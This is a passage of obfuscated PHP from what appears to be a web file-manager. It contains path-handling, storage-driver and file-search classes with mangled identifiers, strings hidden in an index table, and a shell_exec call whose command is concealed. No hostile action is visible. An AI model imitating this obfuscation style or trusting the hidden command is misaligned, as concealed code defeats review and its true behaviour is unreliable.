} return $›ñ¸À“Ÿ; } public static function sourceID($ñ´™ÅÑ·) { $»ıæ İÀ =& $_SERVER[Ùæõ‰Ï’]; $ƒØˆ¢à = self::parse($ñ´™ÅÑ·); if ($ƒØˆ¢à[$»ıæ İÀ[33]] !== self::KOD_SOURCE) { show_json(LNG($»ıæ İÀ[1379]), !1); } return $ƒØˆ¢à[$»ıæ İÀ[475]]; } public static function make($Ñâë»Ûß) { if (!$Ñâë»Ûß) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ñâë»Ûß)); } public static function makeShare($å¡™úˆº, $æø§ß) { return self::makePath(self::KOD_SHARE_ITEM, $å¡™úˆº, $æø§ß); } public static function makeFileTypePath($àë§•ó) { return self::makePath(self::KOD_USER_FILE_TYPE, $àë§•ó); } public static function makeFileTagPath($÷‘î¢¤±) { return self::makePath(self::KOD_USER_FILE_TAG, $÷‘î¢¤±); } public static function makePath($ÄØ©ğÓä, $Ñö„“¯Ï = '', $¡…Ğ ¿– = '') { $«À“˜¾› =& $_SERVER[Ùæõ‰Ï’]; $×Ùù°Ÿ = substr($ÄØ©ğÓä, 1, -1); $ÀÆ¢ª…— = $«À“˜¾›[1380] . $×Ùù°Ÿ . $«À“˜¾›[1381] . $Ñö„“¯Ï . $«À“˜¾›[1382]; $ÀÆ¢ª…— = $¡…Ğ ¿– ? $ÀÆ¢ª…— . $¡…Ğ ¿– . $«À“˜¾›[8] : $ÀÆ¢ª…—; return $ÀÆ¢ª…—; } public static function hashPath($Ğ…£Ğ×, $Ôö“’éñ = true) { $ù£‰èìÊ =& $_SERVER[Ùæõ‰Ï’]; $ì ™Ã– = is_array($Ğ…£Ğ×) ? $Ğ…£Ğ× : IO::info($Ğ…£Ğ×); $ÃğüÆÉï = _get($ì ™Ã–, $ù£‰èìÊ[1383], $ù£‰èìÊ[12]); if (!$ÃğüÆÉï && isset($ì ™Ã–[$ù£‰èìÊ[235]])) { $ÃğüÆÉï = trim($ì ™Ã–[$ù£‰èìÊ[235]], $ù£‰èìÊ[121]); } if (!$ÃğüÆÉï && isset($ì ™Ã–[$ù£‰èìÊ[193]]) && $ì ™Ã–[$ù£‰èìÊ[193]]) { $ì ™Ã– = IO::info(KodIO::make($ì ™Ã–[$ù£‰èìÊ[193]])); $ÃğüÆÉï = _get($ì ™Ã–, $ù£‰èìÊ[1383], $ù£‰èìÊ[12]); } $Åí©Ä‹Ş = md5($ì ™Ã–[$ù£‰èìÊ[87]] . $ì ™Ã–[$ù£‰èìÊ[79]] . $ì ™Ã–[$ù£‰èìÊ[88]]); if (!$ÃğüÆÉï && file_exists($ì ™Ã–[$ù£‰èìÊ[87]])) { $ÃğüÆÉï = Cache::get($Åí©Ä‹Ş . $ù£‰èìÊ[1384]); $ÃğüÆÉï = !1; if (!$ÃğüÆÉï) { $ÃğüÆÉï = IO::hashSimple($ì ™Ã–[$ù£‰èìÊ[87]]); Cache::set($Åí©Ä‹Ş . $ù£‰èìÊ[1384], $ÃğüÆÉï, 3600 * 24 * 30); } } if ($Ôö“’éñ && !$ÃğüÆÉï) { } return $ÃğüÆÉï ? $ÃğüÆÉï : $Åí©Ä‹Ş; } public static function hashPathSafe($ºè£é“, $¥Í¢±ª¥ = true) { $Â¤Ğñ·© =& $_SERVER[Ùæõ‰Ï’]; $š“úô´‚ = self::hashPath($ºè£é“, $¥Í¢±ª¥); return md5($š“úô´‚ . $Â¤Ğñ·©[1385] . Model($Â¤Ğñ·©[853])->get($Â¤Ğñ·©[854])); } public static function initSystemPath() { $İ‰ÂÛúÂ =& $_SERVER[Ùæõ‰Ï’]; if (defined($İ‰ÂÛúÂ[1386])) { return; } define($İ‰ÂÛúÂ[1386], self::systemPath($İ‰ÂÛúÂ[191])); define($İ‰ÂÛúÂ[1387], self::systemPath($İ‰ÂÛúÂ[1388])); define($İ‰ÂÛúÂ[1389], self::systemPath($İ‰ÂÛúÂ[1390])); define($İ‰ÂÛúÂ[1391], self::systemPath($İ‰ÂÛúÂ[1392])); IOHistory::bindEvent(); } public static function systemPath($…•‰û•) { $İ„ÆùØö =& $_SERVER[Ùæõ‰Ï’]; $ğ·ºŠ±ì = $İ„ÆùØö[1393] . ucfirst($…•‰û•); $»æÜ«ß– = Model($İ„ÆùØö[853])->get($ğ·ºŠ±ì); if ($»æÜ«ß–) { return $»æÜ«ß–; } if ($…•‰û• == $İ„ÆùØö[191]) { $»æÜ«ß– = self::make(Model($İ„ÆùØö[907])->systemRootPathAdd($İ„ÆùØö[605])); } else { $»æÜ«ß– = self::systemPath($İ„ÆùØö[191]); $›´Í²—± = self::sourceID($»æÜ«ß–); $»æÜ«ß– = self::make(Model($İ„ÆùØö[907])->mkdir($›´Í²—±, $…•‰û•)); } Model($İ„ÆùØö[853])->set($ğ·ºŠ±ì, $»æÜ«ß–); return $»æÜ«ß–; } public static function systemFolder($µ÷µì§Ó) { $«±’—ƒ’ = IO_PATH_SYSTEM_SOURCE . $µ÷µì§Ó; $ÉïùôĞ = Cache::get($«±’—ƒ’); if (!$ÉïùôĞ) { $¢¾¯»İí = IO::infoFullSimple($«±’—ƒ’); if (!$¢¾¯»İí) { $ÉïùôĞ = IO::mkdir($«±’—ƒ’, REPEAT_SKIP); } else { $ÉïùôĞ = $¢¾¯»İí[$_SERVER[Ùæõ‰Ï’][87]]; } Cache::set($«±’—ƒ’, $ÉïùôĞ, 3600 * 10); } return $ÉïùôĞ; } public static function defaultDriver() { return Model($_SERVER[Ùæõ‰Ï’][850])->defaultDriver(); } public static function defaultIO() { $¯öé­ş =& $_SERVER[Ùæõ‰Ï’]; $¥¢“Š ± = self::defaultDriver(); return $¯öé­ş[1394] . $¥¢“Š ±[$¯öé­ş[475]] . $¯öé­ş[1382]; } public static function defaultDriverInit() { static $ƒ¢¥½ĞÌ = false; if ($ƒ¢¥½ĞÌ) { return $ƒ¢¥½ĞÌ; } $ƒ¢¥½ĞÌ = IO::init(self::defaultIO()); return $ƒ¢¥½ĞÌ; } public static function fileTypeList() { $× Ö£êŸ =& $_SERVER[Ùæõ‰Ï’]; $­©±²æˆ = $GLOBALS[$× Ö£êŸ[6]][$× Ö£êŸ[1395]]; foreach ($­©±²æˆ as $éøëÒ”ø => $ûŠ³Êñé) { $˜ó½Ä†Ø = $× Ö£êŸ[1396] . $éøëÒ”ø; $…¾Ü‡õÛ = LNG($˜ó½Ä†Ø); if ($˜ó½Ä†Ø != $…¾Ü‡õÛ) { $­©±²æˆ[$éøëÒ”ø][$× Ö£êŸ[32]] = $…¾Ü‡õÛ; } } return $­©±²æˆ; } public static function diskList($ÅÛòªá = true) { $Áğá©æº = $_SERVER[Ùæõ‰Ï’][1397]; if ($ÅÛòªá) { $ñ’°›É— = Cache::get($Áğá©æº); if (is_array($ñ’°›É—)) { return $ñ’°›É—; } } $ñ’°›É— = self::diskListGet(); Cache::set($Áğá©æº, $ñ’°›É—, 60); return $ñ’°›É—; } public static function diskListGet() { $ÄÖŸòÎæ =& $_SERVER[Ùæõ‰Ï’]; $æÙéÉ…ö = array(); if ($GLOBALS[$ÄÖŸòÎæ[6]][$ÄÖŸòÎæ[1398]] == $ÄÖŸòÎæ[1399]) { $³ıü‡ìÕ = $ÄÖŸòÎæ[1400]; for ($êÖ­â“‘ = 0; $êÖ­â“‘ < strlen($³ıü‡ìÕ); $êÖ­â“‘++) { $í«Ãøœ = $³ıü‡ìÕ[$êÖ­â“‘] . $ÄÖŸòÎæ[1401]; if (file_exists($í«Ãøœ)) { $æÙéÉ…ö[] = $í«Ãøœ; } } return $æÙéÉ…ö; } if (!function_exists($ÄÖŸòÎæ[101])) { $æÙéÉ…ö[] = $ÄÖŸòÎæ[918]; return $æÙéÉ…ö; } $Ì¸¨Ê¹ = explode($ÄÖŸòÎæ[262], shell_exec($ÄÖŸòÎæ[1402])); array_shift($Ì¸¨Ê¹); array_pop($Ì¸¨Ê¹); $èÍØ”¼° = array($ÄÖŸòÎæ[1403], $ÄÖŸòÎæ[1404], $ÄÖŸòÎæ[1405], $ÄÖŸòÎæ[1406], $ÄÖŸòÎæ[1407], $ÄÖŸòÎæ[1408], $ÄÖŸòÎæ[1409], $ÄÖŸòÎæ[1410]); foreach ($Ì¸¨Ê¹ as $¡€±™»²) { $æıòÛ¢§ = preg_split($ÄÖŸòÎæ[1411], $¡€±™»²); $í«Ãøœ = $æıòÛ¢§[count($æıòÛ¢§) - 1]; if (!strstr($æıòÛ¢§[0], $ÄÖŸòÎæ[1412]) || !$í«Ãøœ) { continue; } $‡™‹¾œ” = rtrim($í«Ãøœ, $ÄÖŸòÎæ[8]) . $ÄÖŸòÎæ[8]; if (in_array($‡™‹¾œ”, $èÍØ”¼°)) { continue; } $æÙéÉ…ö[] = $‡™‹¾œ”; } return $æÙéÉ…ö; } public static function isSameDisk($Êú¼ÆŞÀ, $õ‰’ìê) { $Ó‰šÚÕ =& $_SERVER[Ùæõ‰Ï’]; if ($GLOBALS[$Ó‰šÚÕ[6]][$Ó‰šÚÕ[1398]] == $Ó‰šÚÕ[1399]) { return strtolower(substr($Êú¼ÆŞÀ, 0, 1)) == strtolower(substr($õ‰’ìê, 0, 1)); } $ÚùùæºÄ = self::diskList(); $À•­³Èò = !1; $õ®Á°½– = !1; sort($ÚùùæºÄ); $ÚùùæºÄ = array_reverse($ÚùùæºÄ); $Êú¼ÆŞÀ = rtrim($Êú¼ÆŞÀ, $Ó‰šÚÕ[8]) . $Ó‰šÚÕ[8]; $õ‰’ìê = rtrim($õ‰’ìê, $Ó‰šÚÕ[8]) . $Ó‰šÚÕ[8]; foreach ($ÚùùæºÄ as $î÷êùè) { $ûïª¸½ = strlen($î÷êùè); if (!$À•­³Èò && substr($Êú¼ÆŞÀ, 0, $ûïª¸½) == $î÷êùè) { $À•­³Èò = $î÷êùè; } if (!$õ®Á°½– && substr($õ‰’ìê, 0, $ûïª¸½) == $î÷êùè) { $õ®Á°½– = $î÷êùè; } if ($À•­³Èò && $õ®Á°½–) { break; } } return $À•­³Èò === $õ®Á°½–; } public static function transferType($Œäß¿ô, $„ìÃÊ÷Á) { $·üƒ€¶† =& $_SERVER[Ùæõ‰Ï’]; $¸Á¢÷ÑÙ = self::driverType($Œäß¿ô); $ØØ±î = self::driverType($„ìÃÊ÷Á); if ($¸Á¢÷ÑÙ[$·üƒ€¶†[33]] == $ØØ±î[$·üƒ€¶†[33]] && $¸Á¢÷ÑÙ[$·üƒ€¶†[1413]] == $ØØ±î[$·üƒ€¶†[1413]]) { return $·üƒ€¶†[1414]; } if ($¸Á¢÷ÑÙ[$·üƒ€¶†[33]] == $·üƒ€¶†[951] && $ØØ±î[$·üƒ€¶†[33]] == $·üƒ€¶†[109]) { return $·üƒ€¶†[1292]; } if ($¸Á¢÷ÑÙ[$·üƒ€¶†[33]] == $·üƒ€¶†[109] && $ØØ±î[$·üƒ€¶†[33]] == $·üƒ€¶†[951]) { return $·üƒ€¶†[110]; } return $·üƒ€¶†[1415]; } public static function driverType($Ï–·— ä) { $ËÅÙëàí =& $_SERVER[Ùæõ‰Ï’]; $Í¥öŠáş = str_replace($ËÅÙëàí[1416], $ËÅÙëàí[12], strtolower($Ï–·— ä->getType())); if ($Í¥öŠáş == $ËÅÙëàí[840] || $Í¥öŠáş == $ËÅÙëàí[1417] || $Í¥öŠáş == $ËÅÙëàí[1418]) { $Ï–·— ä = self::defaultDriverInit(); } else { if ($Í¥öŠáş == $ËÅÙëàí[1302] || $Í¥öŠáş == $ËÅÙëàí[1419]) { $Ï–·— ä = IO::init($Ï–·— ä->pathParse[$ËÅÙëàí[1245]]); } } $•¸ûìş = $Ï–·— ä->path; $Í¥öŠáş = str_replace($ËÅÙëàí[1416], $ËÅÙëàí[12], strtolower($Ï–·— ä->getType())); if ($Í¥öŠáş == $ËÅÙëàí[109]) { return array($ËÅÙëàí[33] => $ËÅÙëàí[109], $ËÅÙëàí[1413] => $ËÅÙëàí[12], $ËÅÙëàí[87] => $•¸ûìş, $ËÅÙëàí[98] => $Ï–·— ä); } return array($ËÅÙëàí[33] => $ËÅÙëàí[951], $ËÅÙëàí[1413] => $Ï–·— ä->pathDriver, $ËÅÙëàí[87] => $•¸ûìş, $ËÅÙëàí[98] => $Ï–·— ä); } public static function pathDriverType($¾áíœÙ) { return $¾áíœÙ ? self::driverType(IO::init($¾áíœÙ)) : !1; } public static function pathDriverLocal($ŞÍÆéÊ¾) { $éÌ¯³ÆÃ =& $_SERVER[Ùæõ‰Ï’]; $Ãªò©è¿ = $ŞÍÆéÊ¾ ? self::driverType(IO::init($ŞÍÆéÊ¾)) : !1; return $Ãªò©è¿[$éÌ¯³ÆÃ[33]] == $éÌ¯³ÆÃ[109] ? !0 : !1; } public static function allowCover($ ôÜ€ÈÄ, $Î§ì°Ş¨ = true) { $íŠÓ–‘¾ =& $_SERVER[Ùæõ‰Ï’]; if (is_string($ ôÜ€ÈÄ)) { $ ôÜ€ÈÄ = IO::info($ ôÜ€ÈÄ); } if (!$ ôÜ€ÈÄ || $ ôÜ€ÈÄ[$íŠÓ–‘¾[33]] == $íŠÓ–‘¾[78] || $ ôÜ€ÈÄ[$íŠÓ–‘¾[79]] <= 100) { return !1; } if (isset($ ôÜ€ÈÄ[$íŠÓ–‘¾[1420]]) || !$ ôÜ€ÈÄ[$íŠÓ–‘¾[87]]) { return !1; } if (isset($ ôÜ€ÈÄ[$íŠÓ–‘¾[232]]) && !$ ôÜ€ÈÄ[$íŠÓ–‘¾[232]]) { return !1; } static $©¾É€³ = false; if (!$©¾É€³ || !$Î§ì°Ş¨) { $¬‡ˆÑ“ë = self::driverType(IO::init($ ôÜ€ÈÄ[$íŠÓ–‘¾[87]])); $´ìÓÑ¦» = $¬‡ˆÑ“ë[$íŠÓ–‘¾[98]]; $©¾É€³ = $íŠÓ–‘¾[196]; if ($¬‡ˆÑ“ë[$íŠÓ–‘¾[33]] == $íŠÓ–‘¾[109]) { $©¾É€³ = $íŠÓ–‘¾[1421]; } if ($¬‡ˆÑ“ë[$íŠÓ–‘¾[98]] && is_array($¬‡ˆÑ“ë[$íŠÓ–‘¾[98]]->config)) { $™´ÔÙ—ñ = $¬‡ˆÑ“ë[$íŠÓ–‘¾[98]]->config; if (isset($™´ÔÙ—ñ[$íŠÓ–‘¾[1422]]) && $™´ÔÙ—ñ[$íŠÓ–‘¾[1422]]) { $©¾É€³ = $íŠÓ–‘¾[1421]; } } } return $©¾É€³ == $íŠÓ–‘¾[1421] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($­°Âæ¶¥) { parent::__construct($­°Âæ¶¥); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($¯ˆ”µ•) { $Û¨ó„Ê„ =& $_SERVER[Ùæõ‰Ï’]; if (substr($¯ˆ”µ•, 0, 7) == $Û¨ó„Ê„[313]) { $¯ˆ”µ• = $Û¨ó„Ê„[314] . substr($¯ˆ”µ•, 7); } header($Û¨ó„Ê„[175] . $¯ˆ”µ•); die; } } goto EÍÎî†³¸…; cÎ¡Ù‰– ë: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($²¬¢Ÿæ) { $ÔÈ”Ùíô =& $_SERVER[Ùæõ‰Ï’]; $µ’ƒŠ£… = KodIO::fileTypeList(); $ˆó„ˆÍ = $µ’ƒŠ£…[$²¬¢Ÿæ]; if (!$ˆó„ˆÍ) { return array(); } $‘îÅ»‡­ = $ˆó„ˆÍ[$ÔÈ”Ùíô[169]]; $Š’Ë¢¥¬ = $ÔÈ”Ùíô[7]; if (!$ˆó„ˆÍ[$ÔÈ”Ùíô[169]]) { $éÜ²¶µ° = array_to_keyvalue($µ’ƒŠ£…, $ÔÈ”Ùíô[12], $ÔÈ”Ùíô[169]); $‘îÅ»‡­ = implode($ÔÈ”Ùíô[50], $éÜ²¶µ°); $Š’Ë¢¥¬ = $ÔÈ”Ùíô[2241]; } $é‘œ ôÇ = explode($ÔÈ”Ùíô[50], trim($‘îÅ»‡­, $ÔÈ”Ùíô[50])); return array($Š’Ë¢¥¬, $é‘œ ôÇ); } public function listPathType($±È¯²Ëá) { $ÅÛ‚Œıƒ =& $_SERVER[Ùæõ‰Ï’]; $í³šÃ‹„ = $this->fileTypeWhere($±È¯²Ëá); if (!$í³šÃ‹„) { return array(); } $«Ë¹ˆÇï = USER_ID; $ƒÙ†µ» = Model($ÅÛ‚Œıƒ[598])->getInfo($«Ë¹ˆÇï); $Ù¹Ìé¯ò = array($ÅÛ‚Œıƒ[648] => SourceModel::TYPE_USER, $ÅÛ‚Œıƒ[584] => array($ÅÛ‚Œıƒ[612], $ÅÛ‚Œıƒ[594] . $ƒÙ†µ»[$ÅÛ‚Œıƒ[90]][$ÅÛ‚Œıƒ[193]] . $ÅÛ‚Œıƒ[613]), $ÅÛ‚Œıƒ[649] => $«Ë¹ˆÇï, $ÅÛ‚Œıƒ[646] => 0, $ÅÛ‚Œıƒ[647] => $í³šÃ‹„); return $this->listSource($Ù¹Ìé¯ò); } public function listSearch($Œòê¤, $‘Á‹ËØ§ = 300) { $»ÉîŞãƒ =& $_SERVER[Ùæõ‰Ï’]; if (isset($Œòê¤[$»ÉîŞãƒ[2077]]) && $Œòê¤[$»ÉîŞãƒ[2077]]) { $Œòê¤[$»ÉîŞãƒ[2077]] = str_replace($»ÉîŞãƒ[460], $»ÉîŞãƒ[2242], trim($Œòê¤[$»ÉîŞãƒ[2077]])); } $ö°¤®•ö = $this->_parseSearchWhere($Œòê¤); if (!isset($ö°¤®•ö[$»ÉîŞãƒ[505]])) { $ö°¤®•ö[$»ÉîŞãƒ[505]] = 0; } $Ü®Ñ«›â = $»ÉîŞãƒ[2243]; $‰ë“˜‰ = $ö°¤®•ö; $¹ÚÜ‘‹õ = $Ü®Ñ«›â; $this->_listSearchBindPinyin($Œòê¤, $ö°¤®•ö, $Ü®Ñ«›â); $this->alias($»ÉîŞãƒ[519])->_makeOrder(); $ö°¤®•ö = $this->parseWhereLike($ö°¤®•ö); $ô©óãüà = $this->distinct(!0)->field($Ü®Ñ«›â)->where($ö°¤®•ö)->selectPage($‘Á‹ËØ§); if ($GLOBALS[$»ÉîŞãƒ[6]][$»ÉîŞãƒ[457]][$»ÉîŞãƒ[458]] && Input::check($Œòê¤[$»ÉîŞãƒ[2077]], $»ÉîŞãƒ[655]) && $ô©óãüà[$»ÉîŞãƒ[442]][$»ÉîŞãƒ[429]] == 1 && $ô©óãüà[$»ÉîŞãƒ[442]][$»ÉîŞãƒ[443]] == 0) { $ô©óãüà = $this->distinct(!0)->field($Ü®Ñ«›â)->where($‰ë“˜‰)->limit(1000)->select(); $ô©óãüà = array_page_split($ô©óãüà, !1, $‘Á‹ËØ§); } $this->_listSearchFileContent($ô©óãüà, $Œòê¤, $¹ÚÜ‘‹õ, $‰ë“˜‰); $this->_listSearchDesc($ô©óãüà, $Œòê¤, $¹ÚÜ‘‹õ); $this->_listSearchTag($ô©óãüà, $Œòê¤, $¹ÚÜ‘‹õ); $this->_listSearchGroupTag($ô©óãüà, $Œòê¤, $¹ÚÜ‘‹õ); $this->_listDataApply($ô©óãüà[$»ÉîŞãƒ[445]]); $this->_listMake($ô©óãüà); return $ô©óãüà; } private function _listSearchFileContent(&$Êà‰“È‘, $ĞÏßÃ£Ğ, $÷¯¿É³‘, $öÙ¥Âˆİ) { $­˜ş†ìÜ =& $_SERVER[Ùæõ‰Ï’]; if (!$ĞÏßÃ£Ğ[$­˜ş†ìÜ[2077]] || $Êà‰“È‘[$­˜ş†ìÜ[442]][$­˜ş†ìÜ[429]] > 1) { return; } if (!isset($öÙ¥Âˆİ[$­˜ş†ìÜ[32]]) || !is_array($ĞÏßÃ£Ğ[$­˜ş†ìÜ[541]])) { return; } $öÙ¥Âˆİ[$­˜ş†ìÜ[541]] = array($­˜ş†ìÜ[7], $ĞÏßÃ£Ğ[$­˜ş†ìÜ[541]]); unset($öÙ¥Âˆİ[$­˜ş†ìÜ[32]]); unset($ĞÏßÃ£Ğ[$­˜ş†ìÜ[541]]); $ışç¬ÁÉ = $this->field($÷¯¿É³‘)->where($öÙ¥Âˆİ)->limit($­˜ş†ìÜ[2244])->select(); if (!$ışç¬ÁÉ || count($ışç¬ÁÉ) == 0) { return; } $Êà‰“È‘[$­˜ş†ìÜ[445]] = array_merge($ışç¬ÁÉ, $Êà‰“È‘[$­˜ş†ìÜ[445]]); $Êà‰“È‘[$­˜ş†ìÜ[442]][$­˜ş†ìÜ[443]] += count($ışç¬ÁÉ); } private function _listSearchTag(&$¶ıÍÃï, $êÎÍğÙş, $™™·„ï) { $èö†½¥ =& $_SERVER[Ùæõ‰Ï’]; if (!$êÎÍğÙş[$èö†½¥[2077]] || $¶ıÍÃï[$èö†½¥[442]][$èö†½¥[429]] > 1) { return; } $ëøÚÉùŸ = Model($èö†½¥[2245])->listData(); $“úÔ··Ü = array(); $á±âè¼º = $êÎÍğÙş[$èö†½¥[2077]]; foreach ($ëøÚÉùŸ as $Ã•œÕ») { $ª‹•ÏÍŒ = $Ã•œÕ»[$èö†½¥[32]]; $·¿Öòà™ = str_replace($èö†½¥[53], $èö†½¥[12], Pinyin::get($ª‹•ÏÍŒ)); if (stripos($ª‹•ÏÍŒ, $á±âè¼º) !== !1 || stripos($·¿Öòà™, $á±âè¼º) !== !1) { $“úÔ··Ü[] = $Ã•œÕ»[$èö†½¥[475]]; } } if (!$“úÔ··Ü) { return; } $â ôìÂå = array($èö†½¥[500] => array($èö†½¥[7], $“úÔ··Ü), $èö†½¥[1781] => USER_ID); $¸»²•¹Ø = Model($èö†½¥[502])->field($èö†½¥[87])->where($â ôìÂå)->select(); $¸»²•¹Ø = array_to_keyvalue($¸»²•¹Ø, $èö†½¥[12], $èö†½¥[87]); $ÓšßÇŞî = array_unique($¸»²•¹Ø); $this->_listSearchMerge($¶ıÍÃï, $êÎÍğÙş, $™™·„ï, $ÓšßÇŞî); } private function _listSearchDesc(&$ùî®¿Ğ, $–üÈ¹¨“, $€ÖÌÏôŞ) { $ôĞ®Ñª’ =& $_SERVER[Ùæõ‰Ï’]; if (!$–üÈ¹¨“[$ôĞ®Ñª’[2077]] || $ùî®¿Ğ[$ôĞ®Ñª’[442]][$ôĞ®Ñª’[429]] > 1) { return; } $¸üÊÆÉ = array($ôĞ®Ñª’[97] => $ôĞ®Ñª’[526], $ôĞ®Ñª’[450] => array($ôĞ®Ñª’[459], $ôĞ®Ñª’[2079] . $–üÈ¹¨“[$ôĞ®Ñª’[2077]] . $ôĞ®Ñª’[2079])); $…¦õÖºÆ = !1; if ($…¦õÖºÆ) { $µõÄãÀ = $this->listSearchChildren($–üÈ¹¨“[$ôĞ®Ñª’[192]]); $µõÄãÀ = array_unique($µõÄãÀ); if (!$µõÄãÀ) { return; } $¸üÊÆÉ[$ôĞ®Ñª’[193]] = array($ôĞ®Ñª’[7], $µõÄãÀ); } $ÂËÛÏ·ã = Model($ôĞ®Ñª’[632])->field($ôĞ®Ñª’[193])->where($¸üÊÆÉ)->limit(5000)->select(); $íûàçî¶ = array_to_keyvalue($ÂËÛÏ·ã, $ôĞ®Ñª’[12], $ôĞ®Ñª’[193]); $this->_listSearchMerge($ùî®¿Ğ, $–üÈ¹¨“, $€ÖÌÏôŞ, $íûàçî¶); } private function _listSearchGroupTag(&$í¾Öî, $ú÷æŠåÎ, $½Ğ„Ÿ‡·) { $Ñúâü– =& $_SERVER[Ùæõ‰Ï’]; if (!$ú÷æŠåÎ[$Ñúâü–[2077]] || $í¾Öî[$Ñúâü–[442]][$Ñúâü–[429]] > 1 || !$ú÷æŠåÎ[$Ñúâü–[192]]) { return; } $Ûœ¸‹÷„ = $this->sourceInfo($ú÷æŠåÎ[$Ñúâü–[192]]); if (!$Ûœ¸‹÷„ || $Ûœ¸‹÷„[$Ñúâü–[190]] != SourceModel::TYPE_GROUP) { return; } $‘ ¯ÕŠê = $Ûœ¸‹÷„[$Ñúâü–[569]]; $áŒ©¶ğÊ = Model($Ñúâü–[2246])->get($‘ ¯ÕŠê); $×ö¿¤÷Ó = array(); $Æ””ÃºÖ = $ú÷æŠåÎ[$Ñúâü–[2077]]; foreach ($áŒ©¶ğÊ[$Ñúâü–[445]] as $ˆ©‘Ö—) { $û˜‚¿ = $ˆ©‘Ö—[$Ñúâü–[32]]; $†×ŞÏ£½ = str_replace($Ñúâü–[53], $Ñúâü–[12], Pinyin::get($û˜‚¿)); if (stripos($û˜‚¿, $Æ””ÃºÖ) !== !1 || stripos($†×ŞÏ£½, $Æ””ÃºÖ) !== !1) { $×ö¿¤÷Ó[] = $ˆ©‘Ö—[$Ñúâü–[475]]; } } if (!$×ö¿¤÷Ó) { return; } $ï´Ñ  = array($Ñúâü–[500] => array($Ñúâü–[7], $×ö¿¤÷Ó), $Ñúâü–[1781] => 0, $Ñúâü–[33] => $Ñúâü–[2099] . $‘ ¯ÕŠê); $»ó«´íÜ = Model($Ñúâü–[502])->field($Ñúâü–[87])->where($ï´Ñ )->select(); $»ó«´íÜ = array_to_keyvalue($»ó«´íÜ, $Ñúâü–[12], $Ñúâü–[87]); $”÷ÈÖŒä = array_unique($»ó«´íÜ); $this->_listSearchMerge($í¾Öî, $ú÷æŠåÎ, $½Ğ„Ÿ‡·, $”÷ÈÖŒä); } private function _listSearchMerge(&$›ÇÅ³Â, $‘Âı³±¾, $†ÜÑÒ­¡, $¡öåù‚‡) { $¡Ÿş¼· =& $_SERVER[Ùæõ‰Ï’]; if (!$¡öåù‚‡) { return; } $¹Ã­Î–Ø = array_to_keyvalue($›ÇÅ³Â[$¡Ÿş¼·[445]], $¡Ÿş¼·[12], $¡Ÿş¼·[193]); $ûµ¾èü = array_diff($¡öåù‚‡, $¹Ã­Î–Ø); if (!$ûµ¾èü) { return; } $³óÖ÷ = array($¡Ÿş¼·[193] => array($¡Ÿş¼·[7], $ûµ¾èü)); $ïÂËÈãŒ = $this->field($†ÜÑÒ­¡)->where($³óÖ÷)->select(); if (!$ïÂËÈãŒ) { return; } $ÆëÁßëÖ = array(); foreach ($ïÂËÈãŒ as $¾£„ø‹¯) { if ($this->_listSearchFilter($¾£„ø‹¯, $‘Âı³±¾)) { $ÆëÁßëÖ[] = $¾£„ø‹¯; } } $›ÇÅ³Â[$¡Ÿş¼·[445]] = array_merge($ÆëÁßëÖ, $›ÇÅ³Â[$¡Ÿş¼·[445]]); $›ÇÅ³Â[$¡Ÿş¼·[442]][$¡Ÿş¼·[443]] += count($ÆëÁßëÖ); } private function _listSearchFilter($ğêÕ§Ûâ, $—˜õ¬÷“) { $òÎËÑà =& $_SERVER[Ùæõ‰Ï’]; $Å€Ô¶âá = $ğêÕ§Ûâ[$òÎËÑà[485]] == $òÎËÑà[91]; if (!strstr($ğêÕ§Ûâ[$òÎËÑà[584]], $òÎËÑà[50] . $—˜õ¬÷“[$òÎËÑà[192]] . $òÎËÑà[50])) { return !1; } if (isset($—˜õ¬÷“[$òÎËÑà[486]]) && $—˜õ¬÷“[$òÎËÑà[486]] != $òÎËÑà[859]) { if ($—˜õ¬÷“[$òÎËÑà[486]] == $òÎËÑà[78] && !$Å€Ô¶âá) { return !1; } if ($—˜õ¬÷“[$òÎËÑà[486]] != $òÎËÑà[78] && $Å€Ô¶âá) { return !1; } if (!strstr($ğêÕ§Ûâ[$òÎËÑà[169]], $òÎËÑà[50] . $—˜õ¬÷“[$òÎËÑà[486]] . $òÎËÑà[50])) { return !1; } } if (isset($—˜õ¬÷“[$òÎËÑà[2247]]) && $—˜õ¬÷“[$òÎËÑà[2247]] < $ğêÕ§Ûâ[$òÎËÑà[79]]) { return !1; } if (isset($—˜õ¬÷“[$òÎËÑà[2248]]) && $—˜õ¬÷“[$òÎËÑà[2248]] > $ğêÕ§Ûâ[$òÎËÑà[79]]) { return !1; } if (isset($—˜õ¬÷“[$òÎËÑà[662]]) && $—˜õ¬÷“[$òÎËÑà[662]] != $ğêÕ§Ûâ[$òÎËÑà[529]]) { return !1; } return !0; } public function listSearchChildren($™ó²—óÇ, $‹òÚ§«Ø = 5000) { $§Ôğë° =& $_SERVER[Ùæõ‰Ï’]; $¹ì²‘°± = array(); $˜Õ¯õÍ» = $this->sourceInfo($™ó²—óÇ); $¶˜ƒôëÑ = array($§Ôğë°[584] => array($§Ôğë°[459], $˜Õ¯õÍ»[$§Ôğë°[584]] . $˜Õ¯õÍ»[$§Ôğë°[193]] . $§Ôğë°[613])); $³ÉºàÓ½ = $this->field($§Ôğë°[79])->where($¶˜ƒôëÑ)->limit($‹òÚ§«Ø + 1)->select(); $¡Ï²º¯ = is_array($³ÉºàÓ½) ? count($³ÉºàÓ½) : 0; if ($¡Ï²º¯ > $‹òÚ§«Ø) { return $this->_listSearchChildrenNear($™ó²—óÇ, $‹òÚ§«Ø); } $ïæìé× = $this->field($§Ôğë°[193])->where($¶˜ƒôëÑ)->select(); $¹ì²‘°± = array_to_keyvalue($ïæìé×, $§Ôğë°[12], $§Ôğë°[193]); return $¹ì²‘°±; } private function _listSearchChildrenNear($ªÉì’ƒÇ, $‚¦áà×) { $Šş¬¤ïÇ =& $_SERVER[Ùæõ‰Ï’]; $¯‡˜ıåì = array(); $ÃËê’ìö = array($Šş¬¤ïÇ[192] => $ªÉì’ƒÇ); $‚ù¿¥œ = $this->field($Šş¬¤ïÇ[2249])->where($ÃËê’ìö)->select(); $‘ïÛ»¼Ç = array_to_keyvalue(array_filter_by_field($‚ù¿¥œ, $Šş¬¤ïÇ[485], $Šş¬¤ïÇ[91]), $Šş¬¤ïÇ[12], $Šş¬¤ïÇ[193]); $¯‡˜ıåì = array_merge($¯‡˜ıåì, array_to_keyvalue($‚ù¿¥œ, $Šş¬¤ïÇ[12], $Šş¬¤ïÇ[193])); if 